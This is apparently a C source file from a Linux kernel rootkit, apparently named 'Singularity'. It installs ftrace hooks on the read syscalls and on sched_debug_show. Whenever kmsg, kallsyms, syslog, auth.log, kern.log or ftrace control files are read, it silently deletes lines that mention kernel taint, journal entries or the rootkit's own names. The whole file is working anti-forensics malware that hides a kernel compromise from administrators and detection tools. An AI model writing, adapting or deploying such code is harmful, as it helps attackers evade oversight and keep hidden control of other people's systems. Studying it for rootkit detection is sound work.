#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/clear_taint_dmesg.h"

#define MAX_CAP (64*1024)

static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_read_ia32)(const struct pt_regs *regs);
static int (*orig_sched_debug_show)(struct seq_file *m, void *v);

notrace static bool should_filter_file(const char *filename) {
    if (!filename)
        return false;
    return (strcmp(filename, "kmsg") == 0 ||
            strcmp(filename, "kallsyms") == 0 ||
            strcmp(filename, "enabled_functions") == 0 ||
            strcmp(filename, "control") == 0 ||
            strcmp(filename, "debug") == 0 ||
            strcmp(filename, "trace") == 0 ||
            strcmp(filename, "stat") == 0 ||
            strcmp(filename, "kern.log") == 0 ||
            strcmp(filename, "kern.log.1") == 0 ||
            strcmp(filename, "syslog") == 0 ||
            strcmp(filename, "auth.log") == 0 ||
            strcmp(filename, "auth.log.1") == 0 ||
            strcmp(filename, "vmallocinfo") == 0 ||
            strcmp(filename, "syslog.1") == 0 ||
            strcmp(filename, "touched_functions") == 0);
}

notrace static bool is_kmsg_device(const char *filename) {
    if (!filename)
        return false;
    return strcmp(filename, "kmsg") == 0;
}

notrace static bool line_contains_sensitive_info(const char *line) {
    if (!line)
        return false;
    return (strstr(line, "taint") != NULL ||
            strstr(line, "journal") != NULL ||
            strstr(line, "singularity") != NULL ||
            strstr(line, "Singularity") != NULL ||
            strstr(line, "matheuz") != NULL ||
            strstr(line, "zer0t") != NULL ||
            strstr(line, "jira") != NULL ||
            strstr(line, "obliviate") != NULL);
}

notrace static ssize_t filter_kmsg_line(char __user *user_buf, ssize_t bytes_read) {
    if (bytes_read <= 0 || !user_buf)
        return bytes_read;

    char *kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
    if (!kernel_buf)
        return bytes_read;

    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
        kfree(kernel_buf);
        return bytes_read;
    }

    kernel_buf[bytes_read] = '\0';

    ssize_t ret = line_contains_sensitive_info(kernel_buf) ? 0 : bytes_read;

    kfree(kernel_buf);
    return ret;
}

notrace static ssize_t filter_buffer_content(char __user *user_buf, ssize_t bytes_read) {
    if (bytes_read <= 0 || !user_buf)
        return bytes_read;

    if (bytes_read > MAX_CAP)
        bytes_read = MAX_CAP;

    char *kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
    if (!kernel_buf)
        return -ENOMEM;

    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
        kfree(kernel_buf);
        return -EFAULT;
    }
    kernel_buf[bytes_read] = '\0';

    char *filtered_buf = kzalloc(bytes_read + 1, GFP_KERNEL);
    if (!filtered_buf) {
        kfree(kernel_buf);
        return -ENOMEM;
    }

    size_t filtered_len = 0;
    char *line_start = kernel_buf;
    char *line_end;

    while ((line_end = strchr(line_start, '\n'))) {
        *line_end = '\0';
        if (!line_contains_sensitive_info(line_start)) {
            size_t line_len = strlen(line_start);
            if (filtered_len + line_len + 1 <= bytes_read) {
                memcpy(filtered_buf + filtered_len, line_start, line_len);
                filtered_len += line_len;
                filtered_buf[filtered_len++] = '\n';
            }
        }
        line_start = line_end + 1;
    }

    if (*line_start && !line_contains_sensitive_info(line_start)) {
        size_t line_len = strlen(line_start);
        if (filtered_len + line_len <= bytes_read) {
            memcpy(filtered_buf + filtered_len, line_start, line_len);
            filtered_len += line_len;
        }
    }

    if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
        kfree(kernel_buf);
        kfree(filtered_buf);
        return -EFAULT;
    }

    kfree(kernel_buf);
    kfree(filtered_buf);
    return filtered_len;
}

static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
    if (!orig_read)
        return -EINVAL;

    int fd = regs->di;
    char __user *user_buf = (char __user *)regs->si;
    if (!user_buf)
        return -EFAULT;

    struct file *file = fget(fd);
    if (!file)
        return orig_read(regs);

    const char *filename = NULL;
    if (file->f_path.dentry)
        filename = file->f_path.dentry->d_name.name;

    if (!should_filter_file(filename)) {
        fput(file);
        return orig_read(regs);
    }

    bool is_kmsg = is_kmsg_device(filename);
    fput(file);

    if (is_kmsg) {
        ssize_t result;
        do {
            result = orig_read(regs);
            if (result <= 0)
                return result;
            result = filter_kmsg_line(user_buf, result);
        } while (result == 0);
        return result;
    } else {
        ssize_t bytes_read = orig_read(regs);
        if (bytes_read <= 0)
            return bytes_read;
        return filter_buffer_content(user_buf, bytes_read);
    }
}

static notrace asmlinkage ssize_t hook_read_ia32(const struct pt_regs *regs) {
    if (!orig_read_ia32)
        return -EINVAL;

    int fd = regs->bx;
    char __user *user_buf = (char __user *)regs->cx;
    if (!user_buf)
        return -EFAULT;

    struct file *file = fget(fd);
    if (!file)
        return orig_read_ia32(regs);

    const char *filename = NULL;
    if (file->f_path.dentry)
        filename = file->f_path.dentry->d_name.name;

    if (!should_filter_file(filename)) {
        fput(file);
        return orig_read_ia32(regs);
    }

    bool is_kmsg = is_kmsg_device(filename);
    fput(file);

    if (is_kmsg) {
        ssize_t result;
        do {
            result = orig_read_ia32(regs);
            if (result <= 0)
                return result;
            result = filter_kmsg_line(user_buf, result);
        } while (result == 0);
        return result;
    } else {
        ssize_t bytes_read = orig_read_ia32(regs);
        if (bytes_read <= 0)
            return bytes_read;
        return filter_buffer_content(user_buf, bytes_read);
    }
}

static notrace int hook_sched_debug_show(struct seq_file *m, void *v) {
    if (!orig_sched_debug_show || !m)
        return -EINVAL;

    size_t buf_size = 8192;
    char *buf = kzalloc(buf_size, GFP_KERNEL);
    if (!buf)
        return orig_sched_debug_show(m, v);

    struct seq_file tmp_seq = *m;
    tmp_seq.buf = buf;
    tmp_seq.size = buf_size;
    tmp_seq.count = 0;

    int ret = orig_sched_debug_show(&tmp_seq, v);

    if (m->buf) {
        char *line = buf;
        char *line_ptr;
        while ((line_ptr = strchr(line, '\n'))) {
            *line_ptr = '\0';
            if (!line_contains_sensitive_info(line))
                seq_printf(m, "%s\n", line);
            line = line_ptr + 1;
        }
    }

    kfree(buf);
    return ret;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_read", hook_read, &orig_read),
    HOOK("__ia32_sys_read", hook_read_ia32, &orig_read_ia32),
    HOOK("sched_debug_show", hook_sched_debug_show, &orig_sched_debug_show),
};

notrace int clear_taint_dmesg_init(void) {
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void clear_taint_dmesg_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
